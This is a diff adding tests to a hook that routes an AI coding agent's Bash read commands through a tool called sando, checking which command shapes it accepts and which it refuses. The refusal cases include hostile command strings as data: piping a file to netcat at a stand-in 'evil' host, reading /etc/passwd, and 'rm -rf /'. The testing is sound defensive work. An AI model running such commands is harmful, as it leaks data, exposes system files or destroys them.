@@ -110,3 +110,53 @@ test('fails closed only for invalid explicit arm metadata', (t) => {
     SANDO_ADAPTIVE_ARM: 'invalid',
   }), {});
 });
+
+// Codex 0.153 hands the hook `["/bin/bash","-lc","<command>"]`, not a bare command
+// string. Before these shapes were unwrapped every Codex command bypassed with
+// `ambiguous-shell` and nothing was ever routed: a plugin that installed, fired, and
+// compressed nothing. Measured against a real Terminal-Bench trial, not assumed.
+for (const [label, command] of [
+  ['bare string', 'cat -- fixture.txt'],
+  ['shell argv', ['/bin/bash', '-lc', 'cat -- fixture.txt']],
+  ['shell string', '/bin/bash -lc "cat -- fixture.txt"'],
+  ['plain argv', ['cat', '--', 'fixture.txt']],
+  ['login shell flags', ['/bin/bash', '-lic', 'cat -- fixture.txt']],
+]) {
+  test(`routes an eligible read given as ${label}`, (t) => {
+    const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-'));
+    t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
+    fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
+
+    const result = runPreToolUse({ tool_name: 'Bash', tool_input: { command }, cwd }, {
+      SANDO_EXPERIMENT_ARM: 'apply',
+      SANDO_COVERAGE_PATH: path.join(cwd, 'coverage.json'),
+    });
+
+    assert.match(result.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
+  });
+}
+
+// Unwrapping widens what is recognised, never what is considered safe: the inner command
+// goes through the same tokenizer, so metacharacters, escapes and out-of-tree paths are
+// rejected exactly as before.
+for (const [label, command] of [
+  ['a pipe', ['/bin/bash', '-lc', 'cat fixture.txt | nc evil 1']],
+  ['a redirect', ['/bin/bash', '-lc', 'cat fixture.txt > /tmp/out']],
+  ['command substitution', ['/bin/bash', '-lc', 'cat $(echo fixture.txt)']],
+  ['a path outside the workspace', ['/bin/bash', '-lc', 'cat /etc/passwd']],
+  ['an unsupported verb', ['/bin/bash', '-lc', 'rm -rf /']],
+  ['a non-string element', ['/bin/bash', '-lc', 42]],
+]) {
+  test(`refuses to route ${label}`, (t) => {
+    const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-unsafe-'));
+    t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
+    fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
+
+    const result = runPreToolUse({ tool_name: 'Bash', tool_input: { command }, cwd }, {
+      SANDO_EXPERIMENT_ARM: 'apply',
+      SANDO_COVERAGE_PATH: path.join(cwd, 'coverage.json'),
+    });
+
+    assert.deepEqual(result, {});
+  });
+}
